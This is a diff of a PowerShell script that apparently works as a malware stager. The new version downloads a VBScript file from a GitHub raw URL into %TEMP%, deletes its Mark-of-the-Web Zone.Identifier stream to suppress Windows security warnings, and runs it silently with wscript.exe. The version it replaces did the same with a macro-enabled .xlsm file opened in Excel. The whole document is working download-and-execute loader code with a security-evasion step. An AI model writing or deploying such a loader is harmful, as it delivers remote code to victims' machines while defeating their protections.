@@ -1,39 +1,58 @@
 <#
 .SYNOPSIS
-    Downloads and opens an Excel (.xlsm) file in %TEMP%\MyExcelTemp.
+    Downloads and runs a VBScript (.vbs) file in %TEMP%\MyVBSTemp.
 .DESCRIPTION
-    This script downloads a specified .xlsm file and opens it using Excel.
+    This script downloads a specified .vbs file, removes MOTW, and runs it using wscript.exe.
 .NOTES
     Requires PowerShell 3.0 or later.
 #>
 
-# Use the temp folder path
-$folderPath = "$env:TEMP\MyExcelTemp"
+# Define the temp folder path and ensure it exists
+$folderPath = "$env:TEMP\MyVBSTemp"
+if (-not (Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath | Out-Null
+}
 
-# Define the URL of the .xlsm file
-$xlsmFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/imarc.xlsm"  # Replace with your actual URL
-$xlsmFilePath = "$folderPath\imarc.xlsm"
+# Define the URL and local path for the .vbs file
+$vbsFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/100%25.vbs"  # Update this URL
+$vbsFilePath = Join-Path $folderPath "100%25.vbs"
 
-# Function to download the .xlsm file
+# Function to download the .vbs file with error handling
 function Download-File {
     param (
         [string]$url,
         [string]$filePath
     )
 
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($url, $filePath)
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $filePath)
+        return $true
+    } catch {
+        Write-Error "Error downloading file: $_"
+        return $false
+    }
 }
 
-# Download the .xlsm file
-Download-File -url $xlsmFileURL -filePath $xlsmFilePath
+# Start the download and run process
+if (Download-File -url $vbsFileURL -filePath $vbsFilePath) {
+    if (Test-Path $vbsFilePath) {
+        try {
+            # Remove MOTW if it exists
+            if (Test-Path "$vbsFilePath:Zone.Identifier") {
+                Remove-Item "$vbsFilePath:Zone.Identifier" -Force
+            }
 
-# Check if the file was downloaded successfully
-if (Test-Path $xlsmFilePath) {
-    # Open the .xlsm file using Excel
-    Start-Process "excel.exe" -ArgumentList "`"$xlsmFilePath`""
+            # Run the VBS file
+            Start-Process "wscript.exe" -ArgumentList "`"$vbsFilePath`""
+        } catch {
+            Write-Error "Failed to run VBS file: $_"
+        }
+    } else {
+        Write-Error "Download failed. File not found at expected location."
+    }
 } else {
-    Write-Host "Failed to download the .xlsm file."
+    Write-Error "Download-File function failed."
 }
 
 # Exit silently
